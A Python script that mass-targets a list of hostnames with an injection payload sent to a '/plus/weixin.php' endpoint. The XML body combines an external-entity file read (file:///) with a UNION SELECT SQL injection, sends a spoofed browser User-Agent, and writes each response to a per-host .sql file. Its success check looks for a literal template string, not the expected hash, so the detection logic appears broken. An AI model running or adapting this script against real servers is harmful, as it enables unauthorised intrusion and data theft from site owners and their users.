import requests

def read_hostnames(file_path="hostnames.txt"):
    """
    Read hostnames from a text file and return a list.

    :param file_path: Path to the file containing hostnames.
    :return: A list of hostnames.
    """
    try:
        with open(file_path, "r") as file:
            hostnames = file.read().splitlines()
        return hostnames
    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found.")
        return []

def send_sql_injection_request(url, headers, payload):
    """
    Send a SQL injection request and return the response.

    :param url: The URL for the SQL injection request.
    :param headers: Headers for the HTTP request.
    :param payload: The payload for the SQL injection.
    :return: The response object.
    """
    try:
        response = requests.post(url, headers=headers, data=payload)
        response.raise_for_status()  # Raise an exception for HTTP errors
        return response
    except requests.RequestException as e:
        print(f"Error sending request: {e}")
        return None

def extract_and_save_data(hostname, response):
    """
    Extract and save the retrieved data in a .sql file.

    :param hostname: The hostname being processed.
    :param response: The response object from the SQL injection request.
    """
    try:
        if response.status_code == 200 and "{{md5(num)}}" in response.text:
            print(f"SQL injection successful for {hostname}!")
            data = response.text  # Modify this based on the response format
            filename = f"{hostname}_data.sql"
            with open(filename, "w") as sql_file:
                sql_file.write(data)
            print(f"Retrieved data saved in {filename}.")
        else:
            print(f"SQL injection failed for {hostname}.")
    except Exception as e:
        print(f"Error processing response for {hostname}: {e}")

def main():
    """
    Main function to execute the SQL injection script.
    """
    hostnames = read_hostnames()

    # Define the payload with the SQL injection
    payload = '''
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE copyright [<!ENTITY test SYSTEM "file:///">]>
    <xml>
      <ToUserName>&test;</ToUserName>
      <FromUserName>1111</FromUserName>
      <MsgType>123</MsgType>
      <FuncFlag>3</FuncFlag>
      <Content>1%' union select md5(999999999)#</Content>
    </xml>
    '''

    # Define the request headers
    headers = {
        "Content-Type": "application/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"
    }

    # Iterate over each hostname and check for SQL injection vulnerability
    for hostname in hostnames:
        url = f"http://{hostname}/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709&timestamp=&nonce="
        response = send_sql_injection_request(url, headers, payload)

        if response:
            extract_and_save_data(hostname, response)

if __name__ == "__main__":
    main()
